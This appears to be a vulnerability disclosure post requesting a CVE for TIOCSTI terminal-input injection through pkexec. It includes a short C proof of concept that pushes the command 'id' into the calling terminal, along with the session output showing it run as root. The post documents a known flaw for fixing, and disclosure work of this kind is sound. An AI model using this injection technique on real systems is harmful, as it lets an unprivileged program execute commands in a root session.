This issue has been fixed in "su" by calling setsid() and in "sudo" by   using the "use_pty" flag.  # cat test.c #include <sys/ioctl.h>  int main() {   char *cmd = "id\n";   while(*cmd)    ioctl(0, TIOCSTI, cmd++); }  # gcc test.c -o test # id saken  # pkexec --user saken ./test ----> last command i type in id # id ----> did not type this uid=0(root) gid=0(root) groups=0(root)   This is similar to and  I'd like to request a CVE for this issue.  PS: I don't believe any of the previous mentions of fixes for "su" and "sudo" would work here, since executing a shell via pkexec would make it not have job control.
